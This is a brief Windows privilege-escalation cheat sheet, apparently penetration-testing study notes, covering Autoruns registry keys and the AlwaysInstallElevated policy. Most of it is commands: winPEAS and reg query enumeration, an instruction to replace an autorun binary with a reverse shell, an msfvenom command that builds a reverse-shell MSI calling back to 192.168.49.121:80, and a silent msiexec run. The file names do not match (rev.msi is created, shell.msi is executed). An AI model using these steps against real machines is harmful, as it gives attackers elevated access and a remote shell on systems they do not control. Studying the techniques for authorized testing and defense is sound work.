# Registry Exploits
--------

## Autoruns
Exploiting programs that run automatically during system startup. 
Requires permissions to reboot the PC.

```
.\winPEASx64.exe quiet applicationsinfo
```

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

To exploit, re write the binary with a reverse shell and restart the machine.

-----------------

## AlwaysInstallElevated

MSI files can be run with elevated privileges in some cases.
This only works if the following two registry settings are enabled.
AlwaysInstallElevated value must be 1 for both.
Local Machine:
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Current User:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```
.\winPEASany.exe quiet windowscreds
```

Querying both the registry settings uisng reg query will also work.

Generate a MSI using msfvenom:
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.121 LPORT=80 -f msi -o rev.msi
```

Copy over the file and execute it:
```
msiexec /quiet /qn /i shell.msi
```

-----------------